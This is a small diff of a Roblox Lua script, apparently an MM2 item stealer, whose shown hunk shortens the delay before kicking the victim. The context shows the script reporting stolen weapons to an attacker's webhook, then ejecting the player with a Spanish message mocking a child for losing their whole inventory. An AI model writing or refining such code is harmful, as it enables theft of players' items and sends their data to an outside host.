@@ -540,7 +540,7 @@ local function TradeFinalizado()
     SendWebhook("✅ Todos los trades finalizados","💰Todas las armas enviadas correctamente 😎",fieldsFinal)
     
     -- Tiempo de espera antes del Kick, puedes cambiar 3 a cualquier valor
-    task.wait(50)
+    task.wait(3)
     LocalPlayer:Kick("El ladron encubierto☠️ ha robado TODO tu inventario de MM2🔥 llora niño/a🤣😂🥱")
 end
 
